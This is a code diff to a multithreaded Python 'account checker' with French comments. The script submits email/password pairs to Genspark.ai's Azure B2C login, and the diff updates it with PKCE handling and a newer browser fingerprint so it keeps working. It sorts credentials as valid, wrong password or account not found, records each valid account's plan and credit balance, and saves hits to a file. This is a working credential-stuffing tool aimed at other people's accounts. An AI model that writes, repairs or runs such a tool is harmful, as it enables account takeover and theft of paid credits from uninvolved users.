@@ -3,6 +3,9 @@ import re
 import json
 import os
 import threading
+import hashlib
+import base64
+import secrets
 from queue import Queue
 from time import sleep
 
@@ -35,6 +38,18 @@ USER_URL    = "https://www.genspark.ai/api/user"
 BALANCE_URL = "https://www.genspark.ai/api/payment/get_credit_balance"
 
 
+def generate_pkce():
+    """
+    Génère un couple (code_verifier, code_challenge) PKCE valide.
+    code_verifier = 43 caractères aléatoires URL-safe
+    code_challenge = base64url(sha256(code_verifier))
+    """
+    code_verifier = secrets.token_urlsafe(32)  # 43 chars
+    digest = hashlib.sha256(code_verifier.encode('ascii')).digest()
+    code_challenge = base64.urlsafe_b64encode(digest).rstrip(b'=').decode('ascii')
+    return code_verifier, code_challenge
+
+
 def get_plan_and_balance(session):
     """
     Appelle les deux APIs Genspark après connexion réussie.
@@ -47,6 +62,7 @@ def get_plan_and_balance(session):
         r = session.get(USER_URL, timeout=10)
         if r.status_code == 200:
             data = r.json()
+            # L'API renvoie directement les champs au niveau racine
             info['plan']     = data.get("personal_plan") or \
                                data.get("data", {}).get("personal_plan") or "N/A"
             info['interval'] = data.get("personal_paid_sub_interval") or \
@@ -71,16 +87,13 @@ def get_plan_and_balance(session):
 
 def check_account(email, password):
     """
-    Connexion complète en 3 étapes :
+    Connexion complète via Azure B2C avec PKCE correct :
 
-    Étape 1 : GET  /authorize          → récupère csrf + transId
+    Étape 1 : GET  /authorize          → génère PKCE + récupère csrf + transId
     Étape 2 : POST /SelfAsserted        → soumet email + password
-    Étape 3 : GET  /confirmed           → redirige vers genspark.ai/api/auth
-              - Si la redirection contient 'error='  → compte invalide
-              - Si la redirection contient 'code='   → succès
-                → on suit UNE seule redirection vers /api/auth?code=...
-                → /api/auth pose le cookie session_id valide
-                → on s'arrête là et on utilise la session pour les APIs
+    Étape 3 : GET  /confirmed           → redirige vers genspark.ai/api/auth?code=
+    Étape 4 : GET  /api/auth?code=...   → envoie le code_verifier comme cookie
+                                          → reçoit session_id valide
 
     Retourne ('SUCCESS', session) ou ('CODE_ERREUR', None).
     """
@@ -89,12 +102,17 @@ def check_account(email, password):
         'User-Agent': (
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
             'AppleWebKit/537.36 (KHTML, like Gecko) '
-            'Chrome/108.0.0.0 Safari/537.36'
+            'Chrome/124.0.0.0 Safari/537.36'
         ),
+        'Accept-Language': 'en-US,en;q=0.9',
     })
 
     try:
-        # ── Étape 1 : authorize ───────────────────────────────────────────
+        # ── Étape 1 : authorize + génération PKCE ────────────────────────
+        code_verifier, code_challenge = generate_pkce()
+        nonce = secrets.token_hex(32)
+        state = secrets.token_urlsafe(12)
+
         start_url = (
             "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
             "b2c_1_new_login/oauth2/v2.0/authorize"
@@ -102,13 +120,13 @@ def check_account(email, password):
             "&response_type=code"
             "&redirect_uri=https%3A%2F%2Fwww.genspark.ai%2Fapi%2Fauth"
             "&scope=email+offline_access+openid+profile"
-            "&state=xpwmrIPnDhMBjJGO"
-            "&code_challenge=fV3lU4JOuBYIqOZD-9fy0xvjjMvodCQG1IwZ1FrjFgo"
+            f"&state={state}"
+            f"&code_challenge={code_challenge}"
             "&code_challenge_method=S256"
-            "&nonce=adb5015c40192345d6552754ba3a75adeefff70a6c9407554e91ee523d879d13"
+            f"&nonce={nonce}"
             "&client_info=1&prompt=login"
         )
-        r1 = session.get(start_url, timeout=10)
+        r1 = session.get(start_url, timeout=15)
 
         settings_match = re.search(r'var SETTINGS = ({.*?});', r1.text, re.DOTALL)
         if not settings_match:
@@ -137,7 +155,7 @@ def check_account(email, password):
             params=query_params,
             headers=post_headers,
             data=payload,
-            timeout=10
+            timeout=15
         )
 
         if r2.status_code != 200:
@@ -148,16 +166,16 @@ def check_account(email, password):
         # Détection d'erreur via le body JSON de SelfAsserted
         if r2_data.get("status") == "400":
             message = r2_data.get("message", "")
-            if "Your password is incorrect" in message:
+            if "Your password is incorrect" in message or "incorrect" in message.lower():
                 return 'WRONG_PASSWORD', None
-            if "We can't seem to find your account" in message:
+            if "We can't seem to find your account" in message or "find your account" in message.lower():
                 return 'ACCOUNT_NOT_FOUND', None
             return 'ERROR_API', None
 
         if r2_data.get("status") != "200":
             return 'ERROR_API', None
 
-        # ── Étape 3 : confirmed → 1 redirect → /api/auth?code=... ─────────
+        # ── Étape 3 : confirmed → hop 1 → /api/auth?code= ────────────────
         confirm_url = (
             "https://login.genspark.ai/gensparkad.onmicrosoft.com/"
             "B2C_1_new_login/api/CombinedSigninAndSignup/confirmed"
@@ -165,30 +183,32 @@ def check_account(email, password):
             f"&tx={transaction_id}&p=B2C_1_new_login"
         )
 
-        # NE PAS suivre les redirections automatiquement :
-        # on veut lire l'URL de destination du hop 1
+        # NE PAS suivre les redirections : on veut lire hop1_location
         hop1 = session.get(confirm_url, timeout=15, allow_redirects=False)
         hop1_location = hop1.headers.get('location', '')
 
-        # Si l'URL de redirection contient 'error=' → login échoué côté Azure
+        # Si l'URL de redirection contient 'error=' → login invalide
         if 'error=' in hop1_location:
             if 'AADB2C90053' in hop1_location:
                 return 'ACCOUNT_NOT_FOUND', None
-            if 'incorrect' in hop1_location.lower():
-                return 'WRONG_PASSWORD', None
             return 'INVALID', None
 
-        # Si l'URL contient 'code=' → succès : on suit UNE seule redirection
+        # Si l'URL ne contient pas 'code=' → problème inattendu
         if 'code=' not in hop1_location:
             return 'ERROR_NO_CODE', None
 
-        # Hop 2 : GET /api/auth?code=...
-        # → pose le cookie session_id valide sur www.genspark.ai
-        # → renvoie un 307 vers / (on l'ignore, on ne suit PAS)
+        # ── Étape 4 : GET /api/auth?code=... avec code_verifier ───────────
+        # Le serveur Genspark attend le code_verifier dans un cookie
+        # pour valider l'échange PKCE et poser le session_id
+        session.cookies.set('pkce_code_verifier', code_verifier, domain='www.genspark.ai')
+
         hop2 = session.get(hop1_location, timeout=15, allow_redirects=False)
 
-        # Vérifier que session_id est bien présent dans les cookies
+        # Après hop2, session_id doit être posé sur www.genspark.ai
         if 'session_id' not in session.cookies:
+            # Parfois hop2 renvoie un 307 vers / et le cookie est posé là
+            # On ne suit PAS la redirection vers / (inutile)
+            # Si toujours pas de session_id, c'est un échec
             return 'ERROR_NO_SESSION', None
 
         # Mettre à jour les headers pour les appels API suivants
@@ -245,16 +265,16 @@ def worker():
                     f_out.write(save_line + "\n")
 
                 # Couleur selon le plan
-                if plan == 'pro':
+                if plan and plan.lower() == 'pro':
                     plan_color = Colors.MAGENTA
-                elif plan == 'plus':
+                elif plan and plan.lower() == 'plus':
                     plan_color = Colors.GREEN
                 else:
                     plan_color = Colors.YELLOW
 
                 message = (
                     f"{Colors.GREEN}Compte Valide{Colors.RESET} | "
-                    f"Plan: {plan_color}{plan.upper()}{Colors.RESET} | "
+                    f"Plan: {plan_color}{plan.upper() if plan != 'N/A' else 'N/A'}{Colors.RESET} | "
                     f"Interval: {Colors.CYAN}{interval}{Colors.RESET} | "
                     f"Balance: {Colors.CYAN}{balance} credits{Colors.RESET}"
                 )
